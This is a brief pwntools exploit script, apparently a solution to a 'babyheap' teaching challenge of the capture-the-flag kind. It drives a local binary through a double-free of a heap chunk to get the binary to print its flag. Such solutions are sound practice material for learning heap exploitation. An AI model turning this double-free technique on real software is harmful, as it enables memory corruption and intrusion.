from pwn import *
p = process('/babyheap_level5_teaching1')
p.send(b'malloc\n0\n456\n')
p.send(b'malloc\n1\n456\n')
p.send(b'free\n1\n')
p.send(b'read_flag\n')
p.send(b'free\n0\n')
p.send(b'free\n1\n')
p.send(b'malloc\n0\n458\n')
p.send(b'puts_flag\n')
for i in range(20):
        print(p.recvline())
log.info(p.recvline().decode('utf-8'))
p.close()